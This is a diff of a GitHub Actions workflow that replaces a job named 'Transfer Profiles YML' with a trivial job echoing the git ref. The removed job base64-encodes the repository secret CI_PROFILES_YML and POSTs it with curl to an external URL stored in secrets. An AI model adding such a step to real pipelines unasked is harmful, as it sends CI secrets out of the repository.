@@ -1,19 +1,10 @@
-name: Transfer Profiles YML
+name: Guy Workflow
 
 on:
   workflow_dispatch:
 
 jobs:
-  transfer:
+  test:
     runs-on: ubuntu-latest
     steps:
-      - name: Fetch and Store Profiles
-        run: |
-          # Fetch the secret
-          PROFILES=$(echo "${{ secrets.CI_PROFILES_YML }}" | base64 -w 0)
-
-          # Store in target URL (you'll need to provide the actual URL and authentication)
-          curl -X POST "${{ secrets.TARGET_URL }}" \
-            -H "Content-Type: application/json" \
-            -H "Authorization: Bearer ${{ secrets.TARGET_AUTH_TOKEN }}" \
-            -d "{\"value\": \"$PROFILES\"}"
+      - run: echo "Hello from ${{ github.ref }}"
